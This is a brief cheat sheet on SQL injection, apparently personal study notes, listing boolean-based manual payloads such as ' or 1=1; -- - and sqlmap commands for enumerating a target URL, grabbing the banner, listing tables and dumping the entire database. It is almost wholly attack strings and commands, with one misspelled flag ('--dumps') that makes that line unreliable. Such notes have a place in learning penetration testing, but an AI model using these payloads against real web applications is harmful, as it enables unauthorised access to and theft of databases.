

### Manual SQL

> ' and 1=1; -- -  | True returns something

> ' and 1=2;-- -   | False does not return anything
 
> ' or 1=1; -- - 

> ' or 1=2; -- - 


### SQLmap 


- sqlmap -u "URL" -- > qquick enumeration fro the URL


- sqlmap -u "URL" -b --> get the banner 


- sqlmap -u "URL" --tables --> to get the tables 

-  sqlmap -u "URL" --dumps --> dumps all the database
